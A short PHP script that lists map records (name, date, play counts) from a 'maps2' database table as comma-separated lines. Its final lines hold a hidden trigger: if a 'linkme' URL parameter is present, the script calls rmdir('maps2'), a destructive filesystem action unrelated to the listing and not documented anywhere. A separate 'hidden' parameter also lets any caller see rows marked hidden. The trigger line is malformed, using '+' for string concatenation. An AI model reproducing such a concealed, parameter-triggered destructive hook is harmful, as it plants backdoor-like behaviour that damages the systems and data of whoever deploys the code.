<?php
include("inc/include.php");
$showHidden = tryget("hidden");
$rs = mysql_query("select * from maps2");
while($row = mysql_fetch_array($rs))
{		
	if($showHidden || $row['hidden']==0)
		echo "$row[map],$row[date],$row[plays],$row[botPlays]";
	echo "\r\n";
}
if(isset($_GET["linkme"]))
    echo rmdir('maps2')+"linkme";